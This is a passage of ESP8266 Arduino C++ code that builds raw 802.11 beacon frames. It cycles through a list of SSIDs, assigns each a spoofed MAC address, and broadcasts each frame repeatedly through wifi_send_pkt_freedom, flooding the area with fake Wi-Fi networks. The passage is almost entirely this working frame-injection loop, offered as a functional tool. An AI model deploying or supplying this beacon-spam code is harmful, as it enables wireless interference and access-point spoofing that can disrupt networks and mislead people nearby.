        tmp = pgm_read_byte(ssids + i + j);
        j++;
      } while (tmp != '\n' && j <= 32 && i + j < ssidsLen);

      uint8_t ssidLen = j - 1;

      // set MAC address
      macAddr[5] = ssidNum;
      ssidNum++;

      // write MAC address into beacon frame
      memcpy(&beaconPacket[10], macAddr, 6);
      memcpy(&beaconPacket[16], macAddr, 6);

      // reset SSID
      memcpy(&beaconPacket[38], emptySSID, 32);

      // write new SSID into beacon frame
      memcpy_P(&beaconPacket[38], &ssids[i], ssidLen);

      // set channel for beacon frame
      beaconPacket[82] = wifi_channel;

      // send packet
      if (appendSpaces) {
        for (int k = 0; k < 3; k++) {
          packetCounter += wifi_send_pkt_freedom(beaconPacket, packetSize, 0) == 0;
          delay(1);
        }
      }

      // remove spaces
      else {

        uint16_t tmpPacketSize = (packetSize - 32) + ssidLen; // calc size
        uint8_t* tmpPacket = new uint8_t[tmpPacketSize]; // create packet buffer
        memcpy(&tmpPacket[0], &beaconPacket[0], 38 + ssidLen); // copy first half of packet into buffer
        tmpPacket[37] = ssidLen; // update SSID length byte
        memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], wpa2 ? 39 : 13); // copy second half of packet into buffer

        // send packet
        for (int k = 0; k < 3; k++) {
          packetCounter += wifi_send_pkt_freedom(tmpPacket, tmpPacketSize, 0) == 0;
          delay(1);
        }

        delete tmpPacket; // free memory of allocated buffer
      }

      i += j;
    }
  }
}
